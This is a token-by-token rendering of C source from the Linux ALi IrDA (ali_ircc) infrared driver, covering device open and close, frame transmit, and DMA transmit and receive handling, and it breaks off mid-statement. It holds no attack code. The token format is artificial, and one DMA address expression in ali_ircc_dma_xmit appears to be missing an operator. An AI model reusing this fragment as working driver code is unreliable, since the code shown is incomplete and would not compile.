"actual", "]", ",", "iobase", "+", "UART_TX", ")", ";", "actual", "+", "+;", "}", "return", "actual", ";", "}", "/", "*", "*", "Function", "ali_ircc_net_open", "(", "dev", ")", "*", "*", "Start", "the", "device", "*", "*", "/", "static", "int", "ali_ircc_net_open", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "ali_ircc_cb", "*", "self", ";", "int", "iobase", ";", "char", "hwname", "[", "32", "]", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "0", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Request", "IRQ", "and", "install", "Interrupt", "Handler", "*", "/", "if", "(", "request_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "ali_ircc_interrupt", ",", "0", ",", "dev", "-", ">", "name", ",", "dev", ")", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", ",", "unable", "to", "allocate", "irq", "=", "%", "d", "\\", "n", "\"", ",", "ALI_IRCC_DRIVER_NAME", ",", "self", "-", ">", "io", ".", "irq", ")", ";", "return", "-", "EAGAIN", ";", "}", "/", "*", "*", "Always", "allocate", "the", "DMA", "channel", "after", "the", "IRQ", ",", "and", "clean", "up", "on", "*", "failure", ".", "*", "/", "if", "(", "request_dma", "(", "self", "-", ">", "io", ".", "dma", ",", "dev", "-", ">", "name", ")", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", ",", "unable", "to", "allocate", "dma", "=", "%", "d", "\\", "n", "\"", ",", "ALI_IRCC_DRIVER_NAME", ",", "self", "-", ">", "io", ".", "dma", ")", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "dev", ")", ";", "return", "-", "EAGAIN", ";", "}", "/", "*", "Turn", "on", "interrups", "*", "/", "outb", "(", "UART_IER_RDI", ",", "iobase", "+", "UART_IER", ")", ";", "/", "*", "Ready", "to", "play", "!", "*", "/", "netif_start_queue", "(", "dev", ")", ";", "/", "/", "benjamin", "by", "irport", "/", "*", "Give", "self", "a", "hardware", "name", "*", "/", "sprintf", "(", "hwname", ",", "\"", "ALI", "-", "FIR", "@", "0x", "%", "03x", "\"", ",", "self", "-", ">", "io", ".", "fir_base", ")", ";", "/", "*", "*", "Open", "new", "IrLAP", "layer", "instance", ",", "now", "that", "everything", "should", "be", "*", "initialized", "properly", "*", "/", "self", "-", ">", "irlap", "=", "irlap_open", "(", "dev", ",", "&", "self", "-", ">", "qos", ",", "hwname", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "ali_ircc_net_close", "(", "dev", ")", "*", "*", "Stop", "the", "device", "*", "*", "/", "static", "int", "ali_ircc_net_close", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "ali_ircc_cb", "*", "self", ";", "/", "/", "int", "iobase", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "0", ";", ");", "/", "*", "Stop", "device", "*", "/", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "if", "(", "self", "-", ">", "irlap", ")", "irlap_close", "(", "self", "-", ">", "irlap", ")", ";", "self", "-", ">", "irlap", "=", "NULL", ";", "disable_dma", "(", "self", "-", ">", "io", ".", "dma", ")", ";", "/", "*", "Disable", "interrupts", "*", "/", "SetCOMInterrupts", "(", "self", ",", "FALSE", ")", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "dev", ")", ";", "free_dma", "(", "self", "-", ">", "io", ".", "dma", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "ali_ircc_fir_hard_xmit", "(", "skb", ",", "dev", ")", "*", "*", "Transmit", "the", "frame", "*", "*", "/", "static", "netdev_tx_t", "ali_ircc_fir_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "ali_ircc_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "iobase", ";", "__u32", "speed", ";", "int", "mtt", ",", "diff", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "Make", "sure", "tests", "*", "&", "speed", "change", "are", "atomic", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Note", ":", "you", "should", "make", "sure", "that", "speed", "changes", "are", "not", "going", "*", "to", "corrupt", "any", "outgoing", "frame", ".", "Look", "at", "nsc", "-", "ircc", "for", "the", "gory", "*", "details", "-", "Jean", "II", "*", "/", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "*", "/", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "if", "(", "(", "speed", "!", "=", "self", "-", ">", "io", ".", "speed", ")", "&", "&", "(", "speed", "!", "=", "-", "1", ")", ")", "{", "/", "*", "Check", "for", "empty", "frame", "*", "/", "if", "(", "!", "skb", "-", ">", "len", ")", "{", "ali_ircc_change_speed", "(", "self", ",", "speed", ")", ";", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "else", "self", "-", ">", "new_speed", "=", "speed", ";", "}", "/", "*", "Register", "and", "copy", "this", "frame", "to", "DMA", "memory", "*", "/", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "free", "]", ".", "start", "=", "self", "-", ">", "tx_fifo", ".", "tail", ";", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "free", "]", ".", "len", "=", "skb", "-", ">", "len", ";", "self", "-", ">", "tx_fifo", ".", "tail", "+", "=", "skb", "-", ">", "len", ";", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "skb_copy_from_linear_data", "(", "skb", ",", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "free", "]", ".", "start", ",", "skb", "-", ">", "len", ")", ";", "self", "-", ">", "tx_fifo", ".", "len", "+", "+;", "self", "-", ">", "tx_fifo", ".", "free", "+", "+;", "/", "*", "Start", "transmit", "only", "if", "there", "is", "currently", "no", "transmit", "going", "on", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "len", "=", "=", "1", ")", "{", "/", "*", "Check", "if", "we", "must", "wait", "the", "min", "turn", "time", "or", "not", "*", "/", "mtt", "=", "irda_get_mtt", "(", "skb", ")", ";", "if", "(", "mtt", ")", "{", "/", "*", "Check", "how", "much", "time", "we", "have", "used", "already", "*", "/", "diff", "=", "ktime_us_delta", "(", "ktime_get", "(", "),", "self", "-", ">", "stamp", ")", ";", "/", "*", "self", "-", ">", "stamp", "is", "set", "from", "ali_ircc_dma_receive_complete", "(", ")", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "diff", "=", "%", "d", "*", "**", "**", "**", "\\", "n", "\"", ",", "__func__", ",", "diff", ")", ";", "/", "*", "Check", "if", "the", "mtt", "is", "larger", "than", "the", "time", "we", "have", "*", "already", "used", "by", "all", "the", "protocol", "processing", "*", "/", "if", "(", "mtt", ">", "diff", ")", "{", "mtt", "-", "=", "diff", ";", "/", "*", "*", "Use", "timer", "if", "delay", "larger", "than", "1000", "us", ",", "and", "*", "use", "udelay", "for", "smaller", "values", "which", "should", "*", "be", "acceptable", "*", "/", "if", "(", "mtt", ">", "500", ")", "{", "/", "*", "Adjust", "for", "timer", "resolution", "*", "/", "mtt", "=", "(", "mtt", "+", "250", ")", "/", "500", ";", "/", "*", "4", "discard", ",", "5", "get", "advanced", ",", "Let", "'", "s", "round", "off", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "**", "**", "*", "mtt", "=", "%", "d", "*", "**", "**", "**", "**", "**", "\\", "n", "\"", ",", "__func__", ",", "mtt", ")", ";", "/", "*", "Setup", "timer", "*", "/", "if", "(", "mtt", "=", "=", "1", ")", "/", "*", "500", "us", "*", "/", "{", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "TIMER_IIR_500", ",", "iobase", "+", "FIR_TIMER_IIR", ")", ";", "}", "else", "if", "(", "mtt", "=", "=", "2", ")", "/", "*", "1", "ms", "*", "/", "{", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "TIMER_IIR_1ms", ",", "iobase", "+", "FIR_TIMER_IIR", ")", ";", "}", "else", "/", "*", ">", "2ms", "-", ">", "4ms", "*", "/", "{", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "TIMER_IIR_2ms", ",", "iobase", "+", "FIR_TIMER_IIR", ")", ";", "}", "/", "*", "Start", "timer", "*", "/", "outb", "(", "inb", "(", "iobase", "+", "FIR_CR", ")", "|", "CR_TIMER_EN", ",", "iobase", "+", "FIR_CR", ")", ";", "self", "-", ">", "io", ".", "direction", "=", "IO_XMIT", ";", "/", "*", "Enable", "timer", "interrupt", "*", "/", "self", "-", ">", "ier", "=", "IER_TIMER", ";", "SetCOMInterrupts", "(", "self", ",", "TRUE", ")", ";", "/", "*", "Timer", "will", "take", "care", "of", "the", "rest", "*", "/", "goto", "out", ";", "}", "else", "udelay", "(", "mtt", ")", ";", "}", "/", "/", "if", "(", "if", "(", "mtt", ">", "diff", ")", "}", "//", "if", "(", "mtt", ")", "/", "*", "Enable", "EOM", "interrupt", "*", "/", "self", "-", ">", "ier", "=", "IER_EOM", ";", "SetCOMInterrupts", "(", "self", ",", "TRUE", ")", ";", "/", "*", "Transmit", "frame", "*", "/", "ali_ircc_dma_xmit", "(", "self", ")", ";", "}", "/", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "len", "=", "=", "1", ")", "out", ":", "/", "*", "Not", "busy", "transmitting", "anymore", "if", "window", "is", "not", "full", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "free", "<", "MAX_TX_WINDOW", ")", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "static", "void", "ali_ircc_dma_xmit", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "int", "iobase", ",", "tmp", ";", "unsigned", "char", "FIFO_OPTI", ",", "Hi", ",", "Lo", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "FIFO", "threshold", ",", "this", "method", "comes", "from", "NDIS5", "code", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "len", "<", "TX_FIFO_Threshold", ")", "FIFO_OPTI", "=", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "len", "-", "1", ";", "else", "FIFO_OPTI", "=", "TX_FIFO_Threshold", ";", "/", "*", "Disable", "DMA", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "FIR_CR", ")", "&", "~", "CR_DMA_EN", ",", "iobase", "+", "FIR_CR", ")", ";", "self", "-", ">", "io", ".", "direction", "=", "IO_XMIT", ";", "irda_setup_dma", "(", "self", "-", ">", "io", ".", "dma", ",", "(", "(", "u8", "*", ")", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "start", "self", "-", ">", "tx_buff", ".", "head", ")", "+", "self", "-", ">", "tx_buff_dma", ",", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "len", ",", "DMA_TX_MODE", ")", ";", "/", "*", "Reset", "Tx", "FIFO", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "LCR_A_FIFO_RESET", ",", "iobase", "+", "FIR_LCR_A", ")", ";", "/", "*", "Set", "Tx", "FIFO", "threshold", "*", "/", "if", "(", "self", "-", ">", "fifo_opti_buf", "!", "=", "FIFO_OPTI", ")", "{", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "FIFO_OPTI", ",", "iobase", "+", "FIR_FIFO_TR", ")", ";", "self", "-", ">", "fifo_opti_buf", "=", "FIFO_OPTI", ";", "}", "/", "*", "Set", "Tx", "DMA", "threshold", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "TX_DMA_Threshold", ",", "iobase", "+", "FIR_DMA_TR", ")", ";", "/", "*", "Set", "max", "Tx", "frame", "size", "*", "/", "Hi", "=", "(", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "len", ">", ">", "8", ")", "&", "0x0f", ";", "Lo", "=", "self", "-", ">", "tx_fifo", ".", "queue", "[", "self", "-", ">", "tx_fifo", ".", "ptr", "]", ".", "len", "&", "0xff", ";", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "Hi", ",", "iobase", "+", "FIR_TX_DSR_HI", ")", ";", "outb", "(", "Lo", ",", "iobase", "+", "FIR_TX_DSR_LO", ")", ";", "/", "*", "Disable", "SIP", ",", "Disable", "Brick", "Wall", "(", "we", "don", "'", "t", "support", "in", "TX", "mode", ")", ",", "Change", "to", "TX", "mode", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "tmp", "=", "inb", "(", "iobase", "+", "FIR_LCR_B", ")", ";", "tmp", "&", "=", "~", "0x20", ";", "/", "/", "Disable", "SIP", "outb", "(", "((", "unsigned", "char", ")", "(", "tmp", "&", "0x3f", ")", "|", "LCR_B_TX_MODE", ")", "&", "~", "LCR_B_BW", ",", "iobase", "+", "FIR_LCR_B", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "Change", "to", "TX", "mode", ":", "FIR_LCR_B", "=", "0x", "%", "x", "*", "**", "\\", "n", "\"", ",", "__func__", ",", "inb", "(", "iobase", "+", "FIR_LCR_B", ")", ");", "outb", "(", "0", ",", "iobase", "+", "FIR_LSR", ")", ";", "/", "*", "Enable", "DMA", "and", "Burst", "Mode", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "FIR_CR", ")", "|", "CR_DMA_EN", "|", "CR_DMA_BURST", ",", "iobase", "+", "FIR_CR", ")", ";", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "}", "static", "int", "ali_ircc_dma_xmit_complete", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "int", "iobase", ";", "int", "ret", "=", "TRUE", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Disable", "DMA", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "FIR_CR", ")", "&", "~", "CR_DMA_EN", ",", "iobase", "+", "FIR_CR", ")", ";", "/", "*", "Check", "for", "underrun", "!", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "if", "(", "(", "inb", "(", "iobase", "+", "FIR_LSR", ")", "&", "LSR_FRAME_ABORT", ")", "=", "=", "LSR_FRAME_ABORT", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "LSR_FRAME_ABORT", "*", "**", "**", "**", "**", "\\", "n", "\"", ",", "__func__", ")", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_fifo_errors", "+", "+;", "}", "else", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "}", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "*", "/", "if", "(", "self", "-", ">", "new_speed", ")", "{", "ali_ircc_change_speed", "(", "self", ",", "self", "-", ">", "new_speed", ")", ";", "self", "-", ">", "new_speed", "=", "0", ";", "}", "/", "*", "Finished", "with", "this", "frame", ",", "so", "prepare", "for", "next", "*", "/", "self", "-", ">", "tx_fifo", ".", "ptr", "+", "+;", "self", "-", ">", "tx_fifo", ".", "len", "-", "-;", "/", "*", "Any", "frames", "to", "be", "sent", "back", "-", "to", "-", "back", "?", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "len", ")", "{", "ali_ircc_dma_xmit", "(", "self", ")", ";", "/", "*", "Not", "finished", "yet", "!", "*", "/", "ret", "=", "FALSE", ";", "}", "else", "{", "/", "*", "Reset", "Tx", "FIFO", "info", "*", "/", "self", "-", ">", "tx_fifo", ".", "len", "=", "self", "-", ">", "tx_fifo", ".", "ptr", "=", "self", "-", ">", "tx_fifo", ".", "free", "=", "0", ";", "self", "-", ">", "tx_fifo", ".", "tail", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "}", "/", "*", "Make", "sure", "we", "have", "room", "for", "more", "frames", "*", "/", "if", "(", "self", "-", ">", "tx_fifo", ".", "free", "<", "MAX_TX_WINDOW", ")", "{", "/", "*", "Not", "busy", "transmitting", "anymore", "*", "/", "/", "*", "Tell", "the", "network", "layer", ",", "that", "we", "can", "accept", "more", "frames", "*", "/", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "return", "ret", ";", "}", "/", "*", "*", "Function", "ali_ircc_dma_receive", "(", "self", ")", "*", "*", "Get", "ready", "for", "receiving", "a", "frame", ".", "The", "device", "will", "initiate", "a", "DMA", "*", "if", "it", "starts", "to", "receive", "a", "frame", ".", "*", "*", "/", "static", "int", "ali_ircc_dma_receive", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "int", "iobase", ",", "tmp", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Reset", "Tx", "FIFO", "info", "*", "/", "self", "-", ">", "tx_fifo", ".", "len", "=", "self", "-", ">", "tx_fifo", ".", "ptr", "=", "self", "-", ">", "tx_fifo", ".", "free", "=", "0", ";", "self", "-", ">", "tx_fifo", ".", "tail", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "/", "*", "Disable", "DMA", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "FIR_CR", ")", "&", "~", "CR_DMA_EN", ",", "iobase", "+", "FIR_CR", ")", ";", "/", "*", "Reset", "Message", "Count", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "0x07", ",", "iobase", "+", "FIR_LSR", ")", ";", "self", "-", ">", "rcvFramesOverflow", "=", "FALSE", ";", "self", "-", ">", "LineStatus", "=", "inb", "(", "iobase", "+", "FIR_LSR", ")", ";", "/", "*", "Reset", "Rx", "FIFO", "info", "*", "/", "self", "-", ">", "io", ".", "direction", "=", "IO_RECV", ";", "self", "-", ">", "rx_buff", ".", "data", "=", "self", "-", ">", "rx_buff", ".", "head", ";", "/", "*", "Reset", "Rx", "FIFO", "*", "/", "/", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "LCR_A_FIFO_RESET", ",", "iobase", "+", "FIR_LCR_A", ")", ";", "self", "-", ">", "st_fifo", ".", "len", "=", "self", "-", ">", "st_fifo", ".", "pending_bytes", "=", "0", ";", "self", "-", ">", "st_fifo", ".", "tail", "=", "self", "-", ">", "st_fifo", ".", "head", "=", "0", ";", "irda_setup_dma", "(", "self", "-", ">", "io", ".", "dma", ",", "self", "-", ">", "rx_buff_dma", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "DMA_RX_MODE", ")", ";", "/", "*", "Set", "Receive", "Mode", ",", "Brick", "Wall", "*", "/", "/", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "tmp", "=", "inb", "(", "iobase", "+", "FIR_LCR_B", ")", ";", "outb", "(", "(", "unsigned", "char", ")", "(", "tmp", "&", "0x3f", ")", "|", "LCR_B_RX_MODE", "|", "LCR_B_BW", ",", "iobase", "+", "FIR_LCR_B", ")", ";", "/", "/", "2000", "/", "12", "/", "1", "05", ":", "16PM", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "Change", "To", "RX", "mode", ":", "FIR_LCR_B", "=", "0x", "%", "x", "*", "**", "\\", "n", "\"", ",", "__func__", ",", "inb", "(", "iobase", "+", "FIR_LCR_B", ")", ");", "/", "*", "Set", "Rx", "Threshold", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "RX_FIFO_Threshold", ",", "iobase", "+", "FIR_FIFO_TR", ")", ";", "outb", "(", "RX_DMA_Threshold", ",", "iobase", "+", "FIR_DMA_TR", ")", ";", "/", "*", "Enable", "DMA", "and", "Burst", "Mode", "*", "/", "/", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "CR_DMA_EN", "|", "CR_DMA_BURST", ",", "iobase", "+", "FIR_CR", ")", ";", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "return", "0", ";", "}", "static", "int", "ali_ircc_dma_receive_complete", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "struct", "st_fifo", "*", "st_fifo", ";", "struct", "sk_buff", "*", "skb", ";", "__u8", "status", ",", "MessageCount", ";", "int", "len", ",", "i", ",", "iobase", ",", "val", ";", "st_fifo", "=", "&", "self", "-", ">", "st_fifo", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "MessageCount", "=", "inb", "(", "iobase", "+", "FIR_LSR", ")", "&", "0x07", ";", "if", "(", "MessageCount", ">", "0", ")", "pr_debug", "(", "\"%", "s", "(", "),", "Message", "count", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "MessageCount", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "=", "MessageCount", ";", "i", "+", "+)", "{", "/", "*", "Bank", "0", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "status", "=", "inb", "(", "iobase", "+", "FIR_LSR", ")", ";", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "len", "=", "inb", "(", "iobase", "+", "FIR_RX_DSR_HI", ")", "&", "0x0f", ";", "len", "=", "len", "<", "<", "8", ";", "len", "|", "=", "inb", "(", "iobase", "+", "FIR_RX_DSR_LO", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "RX", "Length", "=", "0x", "%", ".", "2x", ",", "\\", "n", "\"", ",", "__func__", ",", "len", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "RX", "Status", "=", "0x", "%", ".", "2x", ",", "\\", "n", "\"", ",", "__func__", ",", "status", ")", ";", "if", "(", "st_fifo", "-", ">", "tail", ">", "=", "MAX_RX_WINDOW", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "window", "is", "full", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "continue", ";", "}", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "tail", "]", ".", "status", "=", "status", ";", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "tail", "]", ".", "len", "=", "len", ";", "st_fifo", "-", ">", "pending_bytes", "+", "=", "len", ";", "st_fifo", "-", ">", "tail", "+", "+;", "st_fifo", "-", ">", "len", "+", "+;", "}", "for", "(", "i", "=", "0", ";", "i", "<", "=", "MessageCount", ";", "i", "+", "+)", "{", "/", "*", "Get", "first", "entry", "*", "/", "status", "=", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "status", ";", "len", "=", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "len", ";", "st_fifo", "-", ">", "pending_bytes", "-", "=", "len", ";", "st_fifo", "-", ">", "head", "+", "+;", "st_fifo", "-", ">", "len", "-", "-;", "/", "*", "Check", "for", "errors", "*", "/", "if", "(", "(", "status", "&", "0xd8", ")", "|", "|", "self", "-", ">", "rcvFramesOverflow", "|", "|", "(", "len", "=", "=", "0", ")", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "**", "**", "RX", "Errors", "*", "**", "**", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "/", "*", "Skip", "frame", "*", "/", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "self", "-", ">", "rx_buff", ".", "data", "+", "=", "len", ";", "if", "(", "status", "&", "LSR_FIFO_UR", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "**", "**", "FIFO", "Errors", "*", "**", "**", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "}", "if", "(", "status", "&", "LSR_FRAME_ERROR", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "**", "**", "FRAME", "Errors", "*", "**", "**", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "}", "if", "(", "status", "&", "LSR_CRC_ERROR", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_crc_errors", "+", "+;", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "**", "**", "CRC", "Errors", "*", "**", "**", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "}", "if", "(", "self", "-", ">", "rcvFramesOverflow", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "**", "**", "Overran", "DMA", "buffer", "*", "**", "**", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "}", "if", "(", "len", "=", "=", "0", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "*", "Receive", "Frame", "Size", "=", "0", "*", "**", "**", "**", "**", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "}", "else", "{", "if", "(", "st_fifo", "-", ">", "pending_bytes", "<", "32", ")", "{", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "val", "=", "inb", "(", "iobase", "+", "FIR_BSR", ")", ";", "if", "(", "(", "val", "&", "BSR_FIFO_NOT_EMPTY", ")", "==", "0x80", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "**", "**", "**", "BSR_FIFO_NOT_EMPTY", "*", "**", "**", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "/", "*", "Put", "this", "entry", "back", "in", "fifo", "*", "/", "st_fifo", "-", ">", "head", "-", "-;", "st_fifo", "-", ">", "len", "+", "+;", "st_fifo", "-", ">", "pending_bytes", "+", "=", "len", ";", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "status", "=", "status", ";", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "len", "=", "len", ";", "/", "*", "*", "DMA", "not", "finished", "yet", ",", "so", "try", "again", "*", "later", ",", "set", "timer", "value", ",", "resolution", "*", "500", "us", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "TIMER_IIR_500", ",", "iobase", "+", "FIR_TIMER_IIR", ")", ";", "/", "/", "2001", "/", "1", "/", "2", "05", ":", "07PM", "/", "*", "Enable", "Timer", "*", "/", "outb", "(", "inb", "(", "iobase", "+", "FIR_CR", ")", "|", "CR_TIMER_EN", ",", "iobase", "+", "FIR_CR", ")", ";", "return", "FALSE", ";", "/", "*", "I", "'", "ll", "be", "back", "!", "*", "/", "}", "}", "/", "*", "*", "Remember", "the", "time", "we", "received", "this", "frame", ",", "so", "we", "can", "*", "reduce", "the", "min", "turn", "time", "a", "bit", "since", "we", "will", "know", "*", "how", "much", "time", "we", "have", "used", "for", "protocol", "processing", "*", "/", "self", "-", ">", "stamp", "=", "ktime_get", "(", ");", "skb", "=", "dev_alloc_skb", "(", "len", "+", "1", ")", ";", "if", "(", "!", "skb", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_dropped", "+", "+;", "return", "FALSE", ";", "}", "/", "*", "Make", "sure", "IP", "header", "gets", "aligned", "*", "/", "skb_reserve", "(", "skb", ",", "1", ")", ";", "/", "*", "Copy", "frame", "without", "CRC", ",", "CRC", "is", "removed", "by", "hardware", "*", "/", "skb_put", "(", "skb", ",", "len", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "self", "-", ">", "rx_buff", ".", "data", ",", "len", ")", ";", "/", "*", "Move", "to", "next", "frame", "*", "/", "self", "-", ">", "rx_buff", ".", "data", "+", "=", "len", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_bytes", "+", "=", "len", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "skb", "-", ">", "dev", "=", "self", "-", 